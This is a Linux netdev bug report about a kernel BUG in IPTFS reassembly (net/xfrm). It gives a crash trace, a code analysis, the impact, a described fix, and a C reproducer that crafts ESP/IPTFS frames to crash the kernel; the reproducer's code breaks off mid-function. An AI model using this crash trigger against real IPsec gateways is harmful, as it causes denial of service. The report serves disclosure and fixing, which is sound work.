Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.215.170
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795098190;
	b=YxR8JxMaqchJsI9n/NvjMg+6mhKAb2tch+zAF88ZWHLw/tcunN/6G879pmx4Ghe4zO9+
	 ddGonjQTLCNZPqRRbh2ytGns7OsX4I7hu13Yh/zEQ3UUJ8Bw6bdkUJRsMiJdEGKycRQtd
	 v7BhLtuO6DKLSBIaE4e2+uRrHC94to3982Te1yjF6G2J2kXoX4PuDaaf9YClz6NenCTOc
	 5PMe2I2GGXFgy/aqDVHlaDmLN66kTHleEtifyG2qBlFJI8o5hr4KcdEQQq0hjwP+QnYn/
	 /QGAXTYE+nGmTiPh6oySBsCuN1lINp1XPiDaUXexREXw/Cdr/VSawE2+ZvQr1ttM9lw==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795098190;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-Id:X-Mailer:MIME-Version:Content-Transfer-Encoding;
	bh=reYRBsuhsCqmRcOOQM2H+bBiESJA3fY46MwerYfD6ss=;
	b=lbfRh5qoQq1W04nw4kD/m+PYKPj5vQ0RrZy+K7JeuYNb9P4QzUK2qCuyLYh2l0e4yN1K
	 9JPgaK7BMvkhAGNzkOOW1mY3GDijFa4HhKq/DWDMNGl+dIiDocdQgfD0XBJsU1ae1lou7
	 6rADDYQI9TKA/SH08fusIIvJtxB7bIJpQ8n0CpwPBG/hh8UAnvzyOqMUI2ElnVQW6uX2j
	 0PePe/dYtjfPtnrexE2y9q86RU8DcGWpXiCNV7Ofm8n86W3npoG5nrvSx9CGJvxMwxys4
	 JCpbHR2IH/aUiMJU1gMI9qnFPLLmRfkNAn9z81YqfsiMWSaxuRRssLrYWIoXtzEK8sA==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=none header.from=iiitd.ac.in;
	spf=pass smtp.mailfrom=iiitd.ac.in;
	dkim=pass header.d=iiitd.ac.in header.i=@iiitd.ac.in header.a=rsa-sha256 header.s=google header.b=QZm0sOJd;
	arc=none smtp.remote-ip=209.85.215.170
Received: from mail-pg1-f170.google.com (mail-pg1-f170.google.com [209.85.215.170])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 56C87606A320
	for <netdev@vger.kernel.org>; Thu, 19 Nov 2026 14:23:09 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 56C87606A320
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=iiitd.ac.in
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=iiitd.ac.in
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=iiitd.ac.in header.i=@iiitd.ac.in header.a=rsa-sha256 header.s=google header.b=QZm0sOJd
Received: by mail-pg1-f170.google.com with SMTP id 41be03b00d2f7-cd61cef87f1so1471996a12.0
        for <netdev@vger.kernel.org>; Thu, 19 Nov 2026 06:23:09 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=iiitd.ac.in; s=google; t=1795098189; x=1795702989; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=reYRBsuhsCqmRcOOQM2H+bBiESJA3fY46MwerYfD6ss=;
        b=QZm0sOJdkDHEOAWvjmepWOs7qpGPrAmZjv0GCs5nt+4ExOW9iyTs1KIaEcn0jO47pH
         g2aGwnhtSUN7f+G3eyxjkzdmm3n3QLfBaIOwnlgXH+p7WjAWjTYmPUkR0mYHJBcvT3QJ
         QzFPrfI3w5NMfEKdikbSRo6rcmN2G1E17K9qg=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1795098189; x=1795702989;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=reYRBsuhsCqmRcOOQM2H+bBiESJA3fY46MwerYfD6ss=;
        b=kLGXmdVd92ABJJlUOg0cWJ3GCIV8yLlIUiaxoETrKJFYL+lJsA1+vD7wvwlOsyZSPr
         Qz1tfC8Qtcx18mfkL6CMje7aDqlxcgI1iONIdHEtZlJODhGk/17Jn0kb0NQUWeMRIQVw
         sXSb0lmEkWXjGtVJ6SiIZvChFBqAhyj7V1KLa3BOvdI1x/8BYU9rXy0bi8KSGHqbGNBT
         p8N12OPggIOrKLluecdT4vsg1FOSN9KnOeSUh5ytLZK80H+inV11g2CE1ZUQ1pqAoSjP
         /8Osx4EiXsTEBaFtSQI6NDVeYNIzcVR9sHaSGSN0r6ClcUv3u2wHr+IICQ/WLYx+udd9
         ralQ==
X-Gm-Message-State: APuU4Z+jZEk+KoFtVu9YdouEDbCQ+BTvufiJQU1ceetSMQPsbt0jYog6
	zQPUwJJnitoVhq2qssp/Dj2E5ShQCScpFNto9eEQQmTaI5yCfdWWaH6uY3znzw804o0=
X-Gm-Gg: AYBFou2cUr7hAFqCMI9EmVs1aAnI8Ol5MfHVHjrgQMc8rVXL50dAC4B0gk1ZyCWbzNX
	ggWkdxr9psG2R/97AcgE2krTy1SpxKDoarbjOyeVXtaYdcOnATvI4iHw4Rtoh+4Vb90V3bVqNdk
	nEEq/hjc3Ozl6XjvXKsXogD25oFQZMYapvEQeIXRj69bc7gZWa/+Hqsoy5ZVm+5P1TCm2CCsWqb
	dQWHfBJTbHZOEzLkZ/ap4IOK+BGxlywko0cwlvT9zLJfGTxHJYMlSocp+cJ+fOj05BJiXncd71l
	bF+o4im5MksdZTGvIXbGIr/gl+/cIwq4DkrXR3dFPVNPD305CzKPZg0Dvj6x2XDQucVvjDW1fPe
	WX9MeG5vKLm+dQFqk/2OMZmxMEo/6HC0oStg7HShviFn6C7EVOCxOqjiIQa7N2ZZfTRy6nR8H0G
	ycHAWFTz6ZeXgKTyOQdGBvWB+MQcaQCMlTqsXieQbHvGi/8f1DlR4a1KgrHK31K9rrrfoRazSE2
	1bgwC6mTVd2EeXIPLUU1Xxuuv+O8h1NqVqlkUrM+DQtllvN2s3VGcHYISXRyM7mamBTJ7dfi/D3
	9LRHbYodenyT0rucjKnJGPTNeJUIxSNZChPE00jjRErDJFXfbM1SR944sAsN1i9uUKknpsCsIjc
	vGLqzdywhWE/KWleJPj4P9lwqkr4pUghcG8mOci7nYB8z+2hQFIJdinIioWjGVTGB
X-Received: by 2002:a05:6a20:9c94:b0:3cd:9f0b:f7a2 with SMTP id adf61e73a8af0-3fe872ca3b9mr4833452637.11.1795098188128;
        Thu, 19 Nov 2026 06:23:08 -0800 (PST)
Received: from iiitd-S2600STB.iiitd.edu.in ([103.25.231.160])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-8c5cb35830bsm2861330b3a.33.2026.11.19.06.23.04
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 19 Nov 2026 06:23:07 -0800 (PST)
From: Piyus Kedia <piyus@iiitd.ac.in>
To: Steffen Klassert <steffen.klassert@secunet.com>,
	Herbert Xu <herbert@gondor.apana.org.au>,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@kernel.org>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Christian Hopps <chopps@chopps.org>
Cc: netdev@vger.kernel.org,
	linux-kernel@vger.kernel.org
Subject: [BUG] net/xfrm: kernel BUG in iptfs_reassem_cont() - reassembly buffer not required to hold the packet
Date: Thu, 19 Nov 2026 19:53:01 +0530
Message-Id: <20261119142301.3272425-1-piyus@iiitd.ac.in>
X-Mailer: git-send-email 2.34.1
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Post: <mailto:netdev@vger.kernel.org>
List-Help: <mailto:netdev+help@vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netdev+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hello,

We would like to report the following issue in iptfs_reassem_cont.

WHAT HAPPENS

An IPTFS (RFC 9347) receiver can be made to BUG() while reassembling an inner
packet that spans several IPTFS payloads.  skb_put() is given a length taken
from the inner packet's own IP total-length field, which on one of the three
paths that can start a reassembly is not bounded by the size of the buffer:

  skbuff: skb_over_panic: text:ffffffff87205cb0 len:3800 put:1200
                          head:ffff88801de0a000 data:ffff88801de0a050
                          tail:0xf28 end:0xec0 dev:tap0
  kernel BUG at net/core/skbuff.c:214!
  Oops: invalid opcode: 0000 [#1] SMP KASAN PTI
  CPU: 2 UID: 0 PID: 9558 Comm: syz-executor Not tainted 7.3.1 #19
  RIP: 0010:skb_over_panic+0xcd/0xd0 net/core/skbuff.c:219
  Call Trace:
   <TASK>
   skb_put+0xd4/0xe0 net/core/skbuff.c:2641
   iptfs_reassem_cont+0xa30/0xb30 net/xfrm/xfrm_iptfs.c:920
   iptfs_input_ordered+0x479/0x4f0 net/xfrm/xfrm_iptfs.c:1288
   iptfs_input+0x161/0x2b0 net/xfrm/xfrm_iptfs.c:1733
   xfrm_inner_mode_input+0xe0/0x190 net/xfrm/xfrm_input.c:453
   xfrm_input+0xac9/0x1320 net/xfrm/xfrm_input.c:705
   xfrmi_input+0x13a/0x170 net/xfrm/xfrm_interface_core.c:331
   xfrm4_esp_rcv+0x7f/0x1e0 net/ipv4/xfrm4_protocol.c:104
   ip_protocol_deliver_rcu+0x261/0x380 net/ipv4/ip_input.c:207
   ...
   tun_get_user+0x1fa4/0x2bb0 drivers/net/tun.c:2048
   tun_chr_write_iter+0xc9/0x160 drivers/net/tun.c:2094
   ...

tail is 0xf28 (3880) against an end of 0xec0 (3776): the put of 1200 bytes
onto a 2600-byte reassembly, with 80 bytes of headroom, runs 104 bytes past
the end of the buffer.

THE INVARIANT IS THE CODE'S OWN

iptfs_input_ordered() has three ways to obtain the skb that becomes
xtfs->ra_newskb, and the file states what is required of it.  On the reuse
path the requirement is checked, and the comment spells it out:

	} else if (data + iphlen <= skb_headlen(skb) &&
		   skb_tailroom(skb) + tail - data >= iplen) {
		/* Reuse the received skb.
		 ...
		 * For linear buffer space we only require that
		 * linear buffer space is large enough to
		 * eventually hold the entire reassembled
		 * packet (by including tailroom in the check).
		 */

The fallback path allocates for it outright:

	skb = iptfs_pskb_extract_seq(iplen, skbseq, data, capturelen);

The third path does neither.  iptfs_pskb_add_frags() is PREFERRED over the
allocating one, and builds an skb whose capacity reflects the bytes that
arrived (capturelen), not the length the header claims:

	capturelen = min(iplen, remaining);
	if (!skb) {
		if (!fragwalk ||
		    iplen < IPTFS_PKT_SHARE_MIN ||
		    capturelen <= iphlen ||
		    !(skb = iptfs_pskb_add_frags(first_skb, fragwalk,
						 data, capturelen,
						 skbseq, iphlen))) {
			skb = iptfs_pskb_extract_seq(iplen, skbseq, data, capturelen);
		}
	}
	...
	if (skb->len < iplen) {
		/* Start reassembly */
		...
		xtfs->ra_newskb = skb;

So when sharing wins, the buffer carries no guarantee about iplen, and the
invariant the reuse path enforces is simply absent.

A later payload continues that reassembly, and iptfs_reassem_cont() re-reads
the length from the partially assembled header:

	ipremain = __iptfs_iplen(newskb->data);
	ipremain -= newskb->len;
	if (blkoff < ipremain) { ... goto abandon; }
	...
	copylen = min(min(blkoff, remaining), ipremain);
	...
	} else {
		if (skb_linearize(newskb)) { ... goto abandon; }
		/* copy fragment data into newskb */
		if (skb_copy_seq_read(st, data, skb_put(newskb, copylen), copylen))

Every bound on copylen comes from the claimed length.  skb_linearize()
flattens the fragments already present; it does not grow the tailroom to
whatever the header asked for.  The put then exceeds the buffer and
skb_over_panic() fires.

The same applies to the earlier put in the `newskb->len < iphlen` branch
(line 879), whose copylen is bounded by iphremain, also derived from the
claimed header.

HOW IT IS REACHED

Eighteen IPTFS payloads on one SA:

  1. an inner packet declaring 3800 bytes with 1000 carried, so reassembly
     starts; iplen >= IPTFS_PKT_SHARE_MIN (129) and capturelen > iphlen, and
     the tap skb has head_frag = 1, so iptfs_pskb_add_frags() is taken and
     the buffer is sized for what arrived
  2. sixteen continuations of 100 bytes, each declaring a block_offset
     covering the whole remainder so reassembly stays open, and each adding
     one fragment - filling the array to MAX_SKB_FRAGS
  3. one continuation declaring block_offset 1200.  iptfs_skb_can_add_frags()
     must now fail, so the else branch runs: skb_linearize() pulls the
     fragments into a kmalloc-4096 buffer (SKB_WITH_OVERHEAD 3776, 80 bytes
     of headroom, len 2600, tailroom 1096) and skb_put(1200) is 104 bytes
     past the end

REPRODUCED, AND THE FIX VERIFIED, ON UPSTREAM

v7.4-rc3 (commit aebb72744), x86_64, KASAN, same program:

  unpatched:  skb_over_panic: len:3800 put:1200 head:ffff888047ff6000 ...
              kernel BUG at net/core/skbuff.c:214
  patched:    the program runs to completion and exits 0; no oops

Also reproduced on 7.3.1 (#19) with the panic quoted at the top of this
report.  It is deterministic: the same len/put/tail/end values appear on
every run and on both trees, and the same values were recorded 14 times by
the harness that first found it.

The program must run in a fresh network namespace; in an initial namespace
with addresses and routes already configured the ESP packets are counted as
InAddrErrors and never reach xfrm_input(), which produces a silent
non-reproduction.

IMPACT

skb_put() compares tail against end and calls skb_over_panic() before the
copy is performed, so no memory is written out of bounds: this is a reachable
BUG()/oops, not memory corruption.  With panic_on_oops it is a crash; an oops
in softirq receive context is in any case fatal to the machine's networking.

The path is reached from xfrm_input(), i.e. after ESP processing, so an
attacker has to be able to produce packets the SA accepts - the IPsec peer, or
someone holding the keys.  The realistic threat is a malicious or compromised
IPTFS peer crashing the gateway rather than an arbitrary remote host.  IPTFS
exists to aggregate traffic between peers, so that threat model is not
unusual.

Note that skb->tail and skb->len are already incremented when the check
fires, and the abandon path is not taken, so without panic_on_oops the task
is killed while xtfs->ra_newskb still points at an skb whose tail is past its
end and whose len exceeds its buffer, still reachable from the SA.

UPSTREAM STATUS

Reproduced on upstream v7.4-rc3 (commit aebb72744), see above: both put sites are there
(net/xfrm/xfrm_iptfs.c:878 and :919), the sharing path is still preferred
over the allocating one (:1132-:1139), the result still becomes the
reassembly buffer (:1158-:1162), and the reuse path's tailroom check at
:1069 is still the only place the invariant is enforced.  The attached patch
applies to that tree with no offset.

FIX

Attached: bound both copies by the tailroom actually available and abandon
the reassembly otherwise, which is how the function already handles a stream
it cannot complete.  The second check has to come after skb_linearize(),
because that may reallocate and so change the tailroom the copy must fit in.
The comparison is made signed because copylen is u32 while skb_tailroom()
returns int.

This restores at the point of use the invariant the reuse path states, without
disabling the sharing optimisation.  If you would rather enforce it where the
buffer is chosen - refusing iptfs_pskb_add_frags()' skb as a reassembly
buffer unless it can hold iplen, mirroring the check at :1069 - that is the
more direct expression of the same rule, at the cost of the sharing path in
exactly the case it was added for.  I have no strong view on which you prefer.

HOW IT WAS FOUND

Found by an AI-assisted coverage-guided fuzzing setup built on syzkaller,
running against an IPTFS SA on an xfrm interface; the crash was recorded 14
times in one session and has since been reproduced deterministically by hand
on mainline, where the attached patch was also verified to prevent it.
The C reproducer is included below.  It is posted rather than held back
because this is a reachable BUG()/oops and not a memory-safety bug: as set
out above, skb_put() compares tail against end and calls skb_over_panic()
before the caller writes anything, so there is no out-of-bounds access to
turn into anything other than a denial of service on a host that has an
IPTFS SA configured.

No Fixes: tag is given: the tree it was found on carries IPTFS as part of a
squashed base, so there is no upstream hash to cite and a guessed one would be
worse than none.

Thanks and regards,
Piyus Kedia
Kapil Vaswani

---

THE REPRODUCER

Build and run it in a fresh network namespace - it sets up the xfrm state,
the interface and the tap device itself, and in an initial namespace the
ESP packets are counted as Ip InAddrErrors and never reach xfrm_input(),
which looks exactly like non-reproduction:

    gcc -std=gnu99 -O1 -w -static -o hunt-crasher hunt-crasher.c
    unshare -rn ./hunt-crasher

Unpatched it panics within a second or two; with the patch above it runs to
completion and exits 0.

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;

/* every number below was read off THIS build with constants(); none from memory
 * or from a sysroot header, except IFF_UP/IFF_RUNNING which are <net/if.h>
 * ioctl flag bits. */
#define V_IFF_TAP        0x0002
#define V_IFF_NAPI       0x0010
#define V_IFF_NAPI_FRAGS 0x0020
#define V_IFF_NO_PI      0x1000
#define V_TUNSETIFF      0x400454caUL      /* _IOW('T',202,int) */
#define V_TUNSETSNDBUF   0x400454d4UL      /* _IOW('T',212,int) */
#define V_SIOCSIFADDR    0x8916
#define V_SIOCSIFNETMASK 0x891c
#define V_SIOCSIFFLAGS   0x8914
#define V_SIOCGIFHWADDR  0x8927
#define V_NETLINK_XFRM           6
#define V_XFRM_MSG_NEWSA         0x10
#define V_XFRM_MSG_NEWPOLICY     0x13
#define V_XFRM_MODE_IPTFS        5
#define V_XFRM_POLICY_OUT        1
#define V_XFRMA_ALG_AUTH         1
#define V_XFRMA_ALG_CRYPT        2
#define V_XFRMA_ALG_AEAD         0x12
#define V_XFRMA_TMPL             5
#define V_XFRMA_SA_DIR           0x21
#define V_XFRM_SA_DIR_OUT        2
#define V_XFRMA_IPTFS_INIT_DELAY 0x27
#define V_XFRMA_IPTFS_MAX_QSIZE  0x28
#define V_XFRMA_IPTFS_DROP_TIME      0x24
#define V_XFRMA_IPTFS_REORDER_WINDOW 0x25
#define V_XFRM_SA_DIR_IN             1
#define V_IPPROTO_AGGFRAG            0x90
#define RX_LOCAL 0x0a460001u   /* tap0's own address: ESP packets land here */
#define RX_PEER  0x0a460002u
#define IN_SPI   0x44332211u
#define V_IPPROTO_ESP            0x32
#define V_MAX_SKB_FRAGS          17

/* the knob: payload iovecs on the aggregated tap frame == its nr_frags.
 * tun_napi_alloc_frags() makes one page frag per iovec after the first. */
#define NFRAGS 16

#define INIT_DELAY_US 50000u
#define SPI 0x11223344u
#define REQID 1u
#define OUT_S 0x7f000001u   /* outer src 127.0.0.1 */
#define OUT_D 0x7f000002u   /* outer dst 127.0.0.2 */
#define IN_NET 0x0a500000u  /* 10.80.0.0/24 inner dst net */
#define IN_DST 0x0a500005u  /* 10.80.0.5 */
#define RX_SRC 0x0a460002u  /* 10.70.0.2 source of the forwarded frames */

typedef union { u32 a4; u32 a6[4]; } vaddr;
struct vsel { vaddr daddr, saddr; u16 dport,dport_mask,sport,sport_mask,family;
              u8 prefixlen_d,prefixlen_s,proto; int ifindex; u32 user; };
struct vid  { vaddr daddr; u32 spi; u8 proto; };
struct vlft { u64 sb,hb,sp,hp,sa,ha,su,hu; };
struct vcur { u64 bytes,packets,add_time,use_time; };
struct vst  { u32 rw,r,i; };
struct vsa  { struct vsel sel; struct vid id; vaddr saddr; struct vlft lft;
              struct vcur curlft; struct vst stats; u32 seq,reqid; u16 family;
              u8 mode,replay_window,flags; };
struct vpol { struct vsel sel; struct vlft lft; struct vcur curlft;
              u32 priority,index; u8 dir,action,flags,share; };
struct vtmpl{ struct vid id; u16 family; vaddr saddr; u32 reqid;
              u8 mode,share,optional; u32 aalgos,ealgos,calgos; };
struct valgo{ char name[64]; u32 keylen; u8 key[64]; };

/* checked against definition_of() on the running build */
_Static_assert(sizeof(struct vsel)==56, "sel 56");
_Static_assert(sizeof(struct vid)==24, "id 24");
_Static_assert(sizeof(struct vlft)==64, "lft 64");
_Static_assert(sizeof(struct vsa)==224, "usersa_info 224");
_Static_assert(sizeof(struct vpol)==168, "userpolicy_info 168");
_Static_assert(sizeof(struct vtmpl)==64, "user_tmpl 64");

static int nlfd = -1;
static u32 nlseq = 1;
static char mbuf[8192];
static int mlen;

static void m_begin(void) { memset(mbuf, 0, sizeof mbuf); mlen = NLMSG_HDRLEN; }
static void *m_body(int n) { void *p = mbuf + mlen; mlen += (n + 3) & ~3; return p; }
static void m_attr(u16 t, const void *d, int n)
{
	struct nlattr *a = (struct nlattr *)(mbuf + mlen);
	a->nla_len = NLA_HDRLEN + n;
	a->nla_type = t;
	if (n)
		memcpy(mbuf + mlen + NLA_HDRLEN, d, n);
	mlen += (NLA_HDRLEN + n + 3) & ~3;
}
static int m_send(u16 type)
{
	struct nlmsghdr *h = (struct nlmsghdr *)mbuf;
	char rb[8192];
	ssize_t r;
	h->nlmsg_len = mlen;
	h->nlmsg_type = type;
	h->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	h->nlmsg_seq = nlseq++;
	h->nlmsg_pid = 0;
	r = send(nlfd, mbuf, mlen, 0);
	if (r < 0)
		return -errno;
	r = recv(nlfd, rb, sizeof rb, 0);
	if (r < 0)
		return -errno;
	h = (struct nlmsghdr *)rb;
	if (h->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(h);
		return e->error;
	}
	return 0;
}

static u16 ipcsum(void *vp, int n)
{
	u16 *p = vp;
	u32 s = 0;
	while (n > 1) { s += *p++; n -= 2; }
	if (n) s += *(u8 *)p;
	while (s >> 16) s = (s & 0xffff) + (s >> 16);
	return (u16)~s;
}

static int set_if(int cs, const char *name, u32 addr, u32 mask)
{
	struct ifreq ifr;
	struct sockaddr_in *s;
	memset(&ifr, 0, sizeof ifr);
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	s = (struct sockaddr_in *)&ifr.ifr_addr;
	s->sin_family = AF_INET;
	s->sin_addr.s_addr = htonl(addr);
	if (ioctl(cs, V_SIOCSIFADDR, &ifr) < 0)
		return -errno;
	memset(&ifr, 0, sizeof ifr);
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	s = (struct sockaddr_in *)&ifr.ifr_addr;
	s->sin_family = AF_INET;
	s->sin_addr.s_addr = htonl(mask);
	if (ioctl(cs, V_SIOCSIFNETMASK, &ifr) < 0)
		return -errno;
	memset(&ifr, 0, sizeof ifr);
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	ifr.ifr_flags = IFF_UP | IFF_RUNNING;
	if (ioctl(cs, V_SIOCSIFFLAGS, &ifr) < 0)
		return -errno;
	return 0;
}

static int open_tap(const char *name, int flags)
{
	struct ifreq ifr;
	int sndbuf = 0x7fffffff;
	int fd = open("/dev/net/tun", O_RDWR | O_NONBLOCK);
	if (fd < 0) { printf("open tun failed errno=%d\n", errno); return -1; }
	memset(&ifr, 0, sizeof ifr);
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	ifr.ifr_flags = flags;
	if (ioctl(fd, V_TUNSETIFF, &ifr) < 0) {
		printf("TUNSETIFF %s flags=0x%x failed errno=%d\n", name, flags, errno);
		close(fd);
		return -1;
	}
	/* tun_can_build_skb() wants sk_sndbuf == INT_MAX and noblock; with both,
	 * tun_get_user() takes tun_build_skb() -> build_skb() -> head_frag = 1,
	 * which is what xfrm_iptfs.c:2299 demands of the skb being aggregated. */
	if (ioctl(fd, V_TUNSETSNDBUF, &sndbuf) < 0)
		printf("TUNSETSNDBUF %s errno=%d\n", name, errno);
	return fd;
}

static void wr_sysctl(const char *p, const char *v)
{
	int fd = open(p, O_WRONLY);
	if (fd < 0) { printf("sysctl %s open errno=%d\n", p, errno); return; }
	if (write(fd, v, strlen(v)) < 0)
		printf("sysctl %s write errno=%d\n", p, errno);
	close(fd);
}

static u8 mac0[6];

/* An IPTFS INPUT SA.  xfrm_user.c:536-585 forbids DONT_FRAG/INIT_DELAY/
 * MAX_QSIZE/PKT_SIZE on an input SA and allows DROP_TIME/REORDER_WINDOW.
 * replay_window 0 disables anti-replay, which is what lets out-of-order ESP
 * sequence numbers reach iptfs_input_reorder at all. */
static int mk_in_sa(u32 spi, u32 win, u32 reqid, u32 peer)
{
	struct vsa *sa;
	struct valgo al;
	m_begin();
	sa = m_body(sizeof *sa);
	sa->sel.family = 0;
	sa->id.daddr.a4 = htonl(RX_LOCAL);
	sa->id.spi = htonl(IN_SPI);
	sa->id.proto = V_IPPROTO_ESP;
	sa->saddr.a4 = htonl(peer);
	sa->lft.sb = sa->lft.hb = sa->lft.sp = sa->lft.hp = ~(u64)0;
	sa->lft.sa = sa->lft.ha = sa->lft.su = sa->lft.hu = 0;
	sa->reqid = reqid;
	sa->family = AF_INET;
	sa->mode = V_XFRM_MODE_IPTFS;
	sa->replay_window = 0;
	memset(&al, 0, sizeof al);
	strcpy(al.name, "ecb(cipher_null)");
	m_attr(V_XFRMA_ALG_CRYPT, &al, 68);
	memset(&al, 0, sizeof al);
	strcpy(al.name, "digest_null");
	m_attr(V_XFRMA_ALG_AUTH, &al, 68);
	{ u8 dir = V_XFRM_SA_DIR_IN; m_attr(V_XFRMA_SA_DIR, &dir, 1); }
	{ u16 v = (u16)win;  m_attr(V_XFRMA_IPTFS_REORDER_WINDOW, &v, 2); }
	{ u32 v = 1000000u;  m_attr(V_XFRMA_IPTFS_DROP_TIME, &v, 4); }
	return m_send(V_XFRM_MSG_NEWSA);
}

/* eth + ip(proto ESP) + esp(spi,seq) + ip_iptfs_hdr + n inner IPv4 packets +
 * the ESP trailer (pad_len, next_header = IPPROTO_AGGFRAG).  cipher_null means
 * the payload is plaintext and digest_null means there is no ICV, so these
 * bytes are exactly what esp_input hands to iptfs_input. */
static int g_runt, g_ver = 4, g_cont, g_rihl = 5;

static int send_esp2(int tapfd, u32 spi, u32 seq, u16 blkoff, int ninner, int innerlen,
		     int declare_extra, int ihl)
{
	static u8 f[3200];
	int n = 0, i;
	u8 *ip, *esp, *ith;

	memset(f, 0, sizeof f);
	memcpy(f, mac0, 6);
	f[6] = 0x02; f[11] = 0x44;
	f[12] = 0x08; f[13] = 0x00;
	n = 14;
	ip = f + n; n += 20;
	esp = f + n; n += 8;
	ith = f + n; n += 4;

	*(u32 *)(esp + 0) = htonl(spi);
	*(u32 *)(esp + 4) = htonl(seq);
	ith[0] = 0;                              /* subtype: basic */
	ith[1] = 0;                              /* flags */
	*(u16 *)(ith + 2) = htons(blkoff);       /* block_offset */

	/* leading continuation bytes: the tail of a packet whose head was the
	 * runt saved from the previous payload.  block_offset must cover them. */
	{
		int c;
		for (c = 0; c < g_cont; c++)
			f[n++] = (u8)(0x50 + (c & 0x0f));
	}
	for (i = 0; i < ninner; i++) {
		u8 *in = f + n;
		if (n + innerlen > (int)sizeof f - 8)
			break;
		in[0] = (u8)(0x40 | (ihl & 0xf));
		in[2] = (u8)((innerlen + declare_extra) >> 8);
		in[3] = (u8)(innerlen + declare_extra);
		in[8] = 64;
		in[9] = 17;                      /* UDP */
		*(u32 *)(in + 12) = htonl(0x0a640001u);
		*(u32 *)(in + 16) = htonl(0x0a640002u);
		*(u16 *)(in + 10) = ipcsum(in, 20);
		if (innerlen >= 28) {
			*(u16 *)(in + 20) = htons(1111);
			*(u16 *)(in + 22) = htons(2222);
			*(u16 *)(in + 24) = htons((u16)(innerlen - 20));
		}
		n += innerlen;
	}

	/* trailing runt: fewer bytes than the 6 needed to read the IP length,
	 * so __input_process_payload calls iptfs_input_save_runt and the NEXT
	 * payload enters iptfs_reassem_cont's runt branch at 804. */
	{
		int t;
		for (t = 0; t < g_runt; t++)
			f[n++] = (t == 0) ? (u8)((g_ver << 4) | (g_rihl & 0xf))
					  : (u8)(0xB0 + t);
	}
	f[n++] = 0;                              /* ESP trailer pad_len */
	f[n++] = V_IPPROTO_AGGFRAG;              /* ESP trailer next_header */

	ip[0] = 0x45;
	ip[2] = (u8)((n - 14) >> 8);
	ip[3] = (u8)(n - 14);
	ip[8] = 64;
	ip[9] = V_IPPROTO_ESP;
	*(u32 *)(ip + 12) = htonl(RX_PEER);
	*(u32 *)(ip + 16) = htonl(RX_LOCAL);
	*(u16 *)(ip + 10) = ipcsum(ip, 20);

	return (int)write(tapfd, f, (size_t)n);
}

/* An independent read of what xfrm actually did with the packets - not the
 * return code of the call that sent them. */
/* An independent read of what xfrm actually did with the packets - not the
 * return code of the call that sent them.  One named counter. */
static long xfrm_stat(const char *name)
{
	static char b[8192];
	int fd = open("/proc/net/xfrm_stat", O_RDONLY);
	int n;
	char *p;
	if (fd < 0)
		return -1;
	n = (int)read(fd, b, sizeof b - 1);
	close(fd);
	if (n <= 0)
		return -1;
	b[n] = 0;
	p = strstr(b, name);
	if (!p)
		return -2;
	p += strlen(name);
	while (*p == ' ' || *p == '\t')
		p++;
	return strtol(p, NULL, 10);
}

static long t_start_ms;

static long now_ms(void)
{
	struct timespec t;
	clock_gettime(CLOCK_MONOTONIC, &t);
	return (long)t.tv_sec * 1000 + t.tv_nsec / 1000000;
}

static void mark(const char *tag)
{
	printf("t=%-6ld %-8s XfrmInStateDirError=%ld XfrmOutNoQueueSpace=%ld\n",
	       now_ms() - t_start_ms, tag, xfrm_stat("XfrmInStateDirError"),
	       xfrm_stat("XfrmOutNoQueueSpace"));
}

/* one forwarded frame: iov[0] = eth+ip+udp (the linear part), then nf payload
 * iovecs, each of which tun_napi_alloc_frags turns into one page frag. */
static int send_frame(int tapfd, int nf, int chunk, u16 sport)
{
